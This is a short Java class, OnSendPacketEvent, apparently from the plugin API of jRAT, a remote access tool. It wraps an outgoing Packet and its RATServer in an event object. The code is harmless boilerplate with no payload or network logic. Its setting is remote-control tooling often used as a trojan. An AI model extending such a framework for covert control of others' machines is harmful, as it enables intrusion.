package org.jrat.project.api.events;

import org.jrat.project.api.Packet;
import org.jrat.project.api.RATServer;

public class OnSendPacketEvent extends RATServerEvent {

	private Packet packet;

	public OnSendPacketEvent(Packet packet, RATServer server) {
		super(server);
		this.packet = packet;
	}

	public Packet getPacket() {
		return packet;
	}

}
